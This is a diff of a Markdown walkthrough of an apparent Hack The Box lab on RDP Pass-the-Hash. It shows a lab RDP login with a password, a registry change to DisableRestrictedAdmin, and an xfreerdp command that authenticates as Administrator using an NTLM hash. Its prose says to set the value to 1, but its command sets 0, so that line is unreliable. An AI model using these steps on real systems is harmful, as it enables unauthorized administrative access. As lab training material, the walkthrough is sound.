@@ -275,19 +275,19 @@ xfreerdp /v:10.129.203.13 /u:htb-rdp /p:HTBRocks!
 ```
 Once connected I ccould see the file that was left on the Desktop:
 
-[![Screenshot-2025-02-26-112355.png](https://i.postimg.cc/YSYmSvj9/Screenshot-2025-02-26-112355.png)](https://postimg.cc/wtxBfTX8)
+[![Screenshot-2025-02-26-112355.png](https://i.postimg.cc/4xNgdqdh/Screenshot-2025-02-26-112355.png)](https://postimg.cc/WhKKY902)
 
 * **Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**
 
 To allow Pass-the-Hash with the RDP, you need to modify the *DisableRestrictedAdmin* registry key.  Here's the registry path and how you can set it:
 
-Registry Key Path:
+- *Registry Key Path:*
 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
 
-Registry Key:
+- *Registry Key:*
 DisableRestrictedAdmin (REG_DWORD)
 
-Value:
+- *Value:*
 Set the value of DisableRestrictedAdmin to 1 to allow Pass-the-Hash.
 
 So I went into the command line and used the command: 
@@ -296,3 +296,13 @@ So I went into the command line and used the command:
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 [![Screenshot-2025-02-26-113051.png](https://i.postimg.cc/QCyMmDVw/Screenshot-2025-02-26-113051.png)](https://postimg.cc/D41FftrP)
+
+* **Connect via RDP with the Administrator account and submit the flag.txt as you answer.**
+
+I terminated the RDP session for the user htb-rdp and then used the following command in my Linux terminal to connect with the Administrator account using Pass-the-Hash:
+```bash
+xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
+```
+Once connected, I found the flag on the Desktop.
+
+[![Screenshot-2025-02-26-113936.png](https://i.postimg.cc/PfYhF19N/Screenshot-2025-02-26-113936.png)](https://postimg.cc/jCxGDnsr)
